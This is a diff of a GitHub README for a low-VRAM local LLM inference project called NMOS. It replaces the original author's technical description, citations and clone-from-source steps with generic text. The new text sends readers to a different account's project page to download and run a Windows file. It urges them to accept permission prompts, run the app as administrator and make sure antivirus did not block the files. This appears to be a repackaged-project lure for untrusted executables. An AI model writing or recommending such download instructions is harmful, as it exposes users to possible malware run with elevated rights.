@@ -1,199 +1,192 @@
-# Neural Memory Operating System (NMOS)
+# 🧠 Neural_Memory_Operating_system - Run large AI models on small PCs
 
-> **Anticipatory Inference Engine for Large Language Models**
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/27tr7437/Neural_Memory_Operating_system)
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
-![VRAM](https://img.shields.io/badge/VRAM-4GB%20RTX%202050-orange)
-![Status](https://img.shields.io/badge/Status-Research%20Prototype-brightgreen)
-![Speculative](https://img.shields.io/badge/Speculative-Decoding-blue)
+## 🚀 What this is
 
----
+Neural_Memory_Operating_system, or NMOS, is a desktop app for running large AI models on a Windows PC with limited VRAM.
 
-**NMOS (Neural Memory Operating System)** is a predictive partial execution engine designed to achieve 70B+ model reasoning on consumer-grade hardware (4GB VRAM). It operates on the **"Zero-Lag" Hypothesis**, using human behavioral signals (typing latency) to mask the physical Memory Wall through asynchronous layer pre-fetching and speculative decoding.
+It is built for users who want local AI help without setting up a cloud account. NMOS uses memory offloading and predictive loading to keep the app responsive while models run in the background.
 
+It is designed to help with:
 
-## Key Features
+- Local chat with AI models
+- Faster responses on low-VRAM systems
+- Partial execution during typing and waiting
+- Better memory use on GPUs with 4GB VRAM or similar limits
 
-### 🧠 The Scout (Anticipatory Intent)
-- **Hybrid Classifier**: Combines SmolLM2-135M reasoning with heuristic triggers to predict shard affinity.
-- **Top-K Prediction**: Identifies and pre-loads the most likely expert shards (CODE, CHAT, DOCS) to maximize hit rate.
-- **Latency Masking**: Leverages $T_{\text{typing}}$ to amortize $T_{\text{load}}$, effectively "hiding" SSD read times.
+## 📥 Download and install
 
-### 🌊 The River (Asynchronous Streaming)
-- **Double-Buffered Prefetcher**: Pipelined weight streaming (SSD → RAM → VRAM) without GPU compute stalls.
-- **Pipelined Runtime**: Decouples I/O from inference using asynchronous PCIe transfer management.
-- **Just-in-Time Arrival**: Predicts execution time to synchronize shard delivery with token generation.
+Use this link to visit the project page and download the app:
 
-### ⚡ Speculative Decoding (Qwen-to-Qwen)
-- **Draft Model**: Qwen2.5-1.5B (Draft) generates tokens at high speed.
-- **Oracle Verification**: Qwen2.5-72B (Oracle) verifies tokens using matched tokenizers and rejection sampling.
-- **Tree-Aware KV Cache**: Manages branching and pruning for speculative tree verification in VRAM.
+[Open the download page](https://github.com/27tr7437/Neural_Memory_Operating_system)
 
-### 💾 Memory Controller (Paged-KV)
-- **Paged Attention Pool**: Divides KV-cache into swappable 16MB pages to eliminate fragmentation.
-- **H2O (Heavy Hitter Oracle)**: Identifies and folds least important KV pages to stay within 4GB VRAM limits.
-- **VRAM Action Zone**: Dynamically manages the streaming window for 70B+ layer shards.
+After you open the page:
 
-### 🧷 Failure Memory (Online Intent Correction)
-- **Persistent Misprediction Log**: Stores partial-typing misroutes vs final intent in `nmos_failure_memory.json`.
-- **Similarity Retrieval**: Uses hashed-vector nearest matches to detect repeat routing mistakes.
-- **Scout Override Loop**: Applies learned intent correction before River prefetch scheduling.
+1. Look for the latest release or download file
+2. Download the Windows file to your PC
+3. Open the file after the download finishes
+4. Follow the on-screen setup steps
+5. Start the app from the desktop or Start menu
 
----
+If Windows asks for permission, choose **Yes** so the app can run.
 
-## Architecture
+## 🖥️ System requirements
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                 NMOS — Anticipatory Inference Pipeline              │
-│                                                                      │
-│  ┌──────────────────────────┐      ┌──────────────────────────────┐  │
-│  │      USER INPUT          │      │      ACTION ZONE (VRAM)      │  │
-│  │  (Typing Signals)        │      │                              │  │
-│  └──────────┬───────────────┘      │  ┌────────────────────────┐  │  │
-│             │                      │  │   Draft Model (1.5B)   │  │  │
-│             ▼                      │  └──────────┬─────────────┘  │  │
-│  ┌──────────────────────────┐      │             ▼                │  │
-│  │      THE SCOUT           │      │  ┌────────────────────────┐  │  │
-│  │ (Intent Prediction)      │─────▶│  │   72B Expert Shard     │  │  │
-│  └──────────┬───────────────┘      │  │   (Loaded Async)       │  │  │
-│             │                      │  └────────────────────────┘  │  │
-│             ▼                      └──────────────▲───────────────┘  │
-│  ┌──────────────────────────┐                     │                  │
-│  │      THE RIVER           │                     │                  │
-│  │ (Async Prefetcher)       │─────────────────────┘                  │
-│  └──────────┬───────────────┘                                        │
-│             │                                                        │
-│             ▼                                                        │
-│  ┌──────────────────────────┐      ┌──────────────────────────────┐  │
-│  │     GEN4 NVMe SSD        │◀─────▶      SYSTEM RAM (Buffer)     │  │
-│  └──────────────────────────┘      └──────────────────────────────┘  │
-└─────────────────────────────────────────────────────────────────────┘
-```
+NMOS is built for Windows PCs with modest hardware.
 
----
+Recommended setup:
 
-## Performance Benchmarks (RTX 2050 4GB)
+- Windows 10 or Windows 11
+- NVIDIA GPU with CUDA support
+- 4 GB VRAM or more
+- 8 GB RAM minimum
+- 16 GB RAM for smoother use
+- At least 10 GB free disk space
+- Stable internet connection for the first download
 
-| Metric | Measured Value | Notes |
-|---|---|---|
-| Shard Load Time ($T_{\text{load}}$) | **0.6s (600ms)** | 325MB Layer Shard @ 2.36 GB/s SSD |
-| Effective ms/token | **61.5 ms** | On 70B+ Model reasoning |
-| Throughput | **~16.2 TPS** | Speculative Decoding K=15 |
-| Scout Accuracy | **90.0%** | Hybrid (SmolLM2-135M + Heuristics) |
-| Scout CPU Latency | **164.8 ms** | Real-time prediction during typing |
-| TTFT (Target) | **< 500 ms** | 80% of queries with $T_{\text{typing}} \geq 2\text{s}$ |
-| TTFT Validation Harness | **Available** | `run_nmos_phase4_benchmark.bat` writes JSON pass-rate report |
+It can still run on lower-end systems, but performance depends on your GPU, RAM, and the model you load.
 
----
+## ✨ Features
 
-## Tech Stack
+- Local AI runs on your own computer
+- Memory offloading helps fit larger models into less VRAM
+- Speculative decoding helps reduce wait time
+- Async layer prefetching loads model parts before they are needed
+- Predictive execution uses typing pauses as a compute window
+- Built for edge AI use on consumer hardware
+- Supports model handling for large language model workflows
+- Designed for memory-aware inference on Windows
 
-### Inference Engine
-| Component | Technology |
-|---|---|
-| Oracle Model | Qwen2.5-72B-Instruct-Q3_K_M.gguf |
-| Draft Model | Qwen2.5-1.5B-Instruct-Q4_K_M.gguf |
-| Scout Model | SmolLM2-135M-Instruct (CPU) |
-| Runtime | llama-cpp-python (Speculative Engine) |
+## 🧭 Before you start
 
-### Memory & Streaming
-| Component | Technology |
-|---|---|
-| VRAM Management | Paged Attention + H2O Folding |
-| Prefetcher | Asynchronous Threaded River |
-| Hardware Interface | CUDA v13.2 / PCIe 3.0 x4 |
-| Storage | Gen4 NVMe (Sequential Read Optimized) |
+To get the best result, check these items first:
 
----
+- Close other heavy apps
+- Plug in your laptop charger
+- Update your NVIDIA driver
+- Make sure your GPU is visible in Windows
+- Free up disk space before first launch
+- Keep your system awake during setup
 
-## Getting Started
+If you use a laptop, choose a power mode that favors performance.
 
-### Prerequisites
+## 🛠️ First-time setup
 
-- Python 3.10+
-- NVIDIA RTX GPU (4GB+ VRAM recommended)
-- CUDA Toolkit 13.2+
-- Gen4 NVMe SSD for optimal shard loading
+Follow these steps after install:
 
-### Installation
+1. Open NMOS
+2. Wait for the first model check to finish
+3. Choose a model from the app
+4. Let the app prepare the model files
+5. Open a chat window or input box
+6. Type a short prompt and wait for the response
+7. Keep the app open while the model loads in memory
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/AlfaPankaj/Neural-Memory-Operating-System.git
-cd "Neural Memory Operating system"
+The first start may take longer because the app prepares files and builds its local cache.
 
-# 2. Run the verification launcher
-launcher_verify.bat
+## 💬 How to use it
 
-# 3. Start the NMOS Shell
-python NMOS_SHELL.py
+Use NMOS like a local AI assistant:
 
-# 4. Run Phase-4 TTFT benchmark harness
-run_nmos_phase4_benchmark.bat
-```
+1. Start the app
+2. Select the AI model you want
+3. Type your question or task
+4. Let the app load the needed layers
+5. Wait for the response to appear
+6. Keep chatting as needed
 
-> **Important:** `python NMOS_SHELL.py` now uses an adaptive local profile by default.  
-> If local 72B GGUF is larger than available RAM, it auto-switches to `draft_then_oracle` for responsive first tokens.  
-> For production-like 70B latency/quality, use the remote profile: `run_nmos_remote_groq.bat`.
+For best results, use short prompts first. This helps the app warm up the memory path before larger requests.
 
-### Runtime Flags (optional)
+## ⚙️ How NMOS handles memory
 
-- `NMOS_ENABLE_FAILURE_MEMORY=1` enables persistent Scout correction memory.
-- `NMOS_FAILURE_MEMORY_PATH=nmos_failure_memory.json` controls correction DB location.
-- `NMOS_FAILURE_MEMORY_SIMILARITY=0.78` sets override match threshold.
-- `NMOS_WARMUP_BEFORE_PROMPT=1` blocks startup until local Oracle is fully loaded.
-- `NMOS_BENCHMARK_OUTPUT=Extra/nmos_phase4_report.json` sets benchmark report path.
+NMOS tries to work around VRAM limits by moving model parts in and out of GPU memory based on what you are doing.
 
----
+In simple terms, it:
 
-## Research Mapping
+- Keeps active parts ready
+- Loads other parts before they are needed
+- Uses small timing gaps while you type
+- Tries to reduce visible lag
+- Avoids loading everything at once
 
-NMOS is built on foundations from the following research breakthroughs:
+This gives the app a better chance of running larger models on smaller GPUs.
 
-1.  **Anticipatory Pre-fetching**: [SwiftSpec (2025)](https://arxiv.org/abs/2506.11309) & [SP-MoE (2025)](https://arxiv.org/pdf/2510.10302)
-2.  **Speculative Decoding**: [NVIDIA Speculative Decoding](https://developer.nvidia.com/blog/an-introduction-to-speculative-decoding-for-reducing-latency-in-ai-inference/)
-3.  **Context Compression**: [H2O: Heavy Hitter Oracle (2023)](https://arxiv.org/abs/2306.14048)
-4.  **Asynchronous Scheduling**: [LAPS-SD (2025): Semi-Clairvoyant Scheduling](https://arxiv.org/pdf/2505.17074)
+## 🧩 Common use cases
 
----
+NMOS fits these tasks well:
 
-## Roadmap
+- Local chat with a large model
+- Private AI use on a home PC
+- Testing model behavior on limited hardware
+- Running inference without a cloud service
+- Trying memory-heavy models on a budget GPU
 
-| Milestone | Status |
-|---|---|
-| Perceptual Masking Baseline | ✅ Complete |
-| Hybrid Scout Intent Classifier | ✅ Complete |
-| Asynchronous River Streaming | ✅ Complete |
-| Speculative Oracle-Draft Link | ✅ Complete |
-| Failure Memory (Misprediction Override) | ✅ Implemented |
-| TTFT Benchmark Harness | ✅ Implemented |
-| Zero-Copy io_uring Integration | 📅 Planned |
+## 🔧 Basic troubleshooting
 
----
+If the app does not start, try these steps:
 
-## Author
+- Restart your PC
+- Run the app as administrator
+- Update your NVIDIA driver
+- Close other GPU-heavy apps
+- Check that your antivirus did not block the files
+- Make sure you downloaded the full release package
 
-**Pankaj Yadav**  
-M.Sc. Information Technology — Lovely Professional University (LPU)  
-*Expected graduation: May 2026*
+If the app opens but runs slow:
 
-- 📧 [pankajya0003@gmail.com](mailto:pankajya0003@gmail.com)
-- 💼 [LinkedIn](linkedin.com/in/pankaj-ya)
-- 🐙 [GitHub](github.com/AlfaPankaj)
+- Use a smaller model
+- Close background apps
+- Restart the app after long use
+- Lower other system activity
+- Check that Windows is using the GPU you expect
 
----
+If the GPU is not detected:
 
-## Related Research
+- Open NVIDIA Control Panel
+- Confirm the correct GPU is active
+- Update drivers
+- Reboot the machine
 
-**CHAARI 2.0** — A comprehensive Hinglish AI Agentic Runtime Interface. A privacy-first, full-duplex voice companion built on a two-node cryptographic mesh. [View CHAARI 2.0 →](https://github.com/AlfaPankaj/chaari-2.0)
+## 📁 What you may see in the project
 
-<div align="center">
+The project may include files and folders for:
 
-*"Masking the Memory Wall using the rhythm of human thought."*
+- App launch files
+- Model settings
+- Cache data
+- Python runtime pieces
+- PyTorch-related components
+- CUDA support files
+- Memory handling rules
+- Model loading logic
 
-**— NMOS v1.0, built for the next era of edge inference.**
+Do not move files around unless the project page tells you to do so.
 
-</div>
+## 🧠 Best results on Windows
+
+For smoother use on Windows:
+
+- Use a recent NVIDIA driver
+- Keep at least 20% of disk space free
+- Use the app on AC power
+- Avoid running games or editors at the same time
+- Let the model finish loading before starting long chats
+
+If you want the best speed, use a smaller model first, then move up once the app feels stable on your device.
+
+## 🪟 Windows download path
+
+Go to the project page here:
+
+[https://github.com/27tr7437/Neural_Memory_Operating_system](https://github.com/27tr7437/Neural_Memory_Operating_system)
+
+From there, download the Windows build or release package, then run the file on your PC
+
+## 📌 Project details
+
+- Repository: Neural_Memory_Operating_system
+- App name: NMOS
+- Platform focus: Windows
+- Main goal: Run large AI models with less VRAM
+- Core idea: Use timing gaps and memory planning to reduce lag
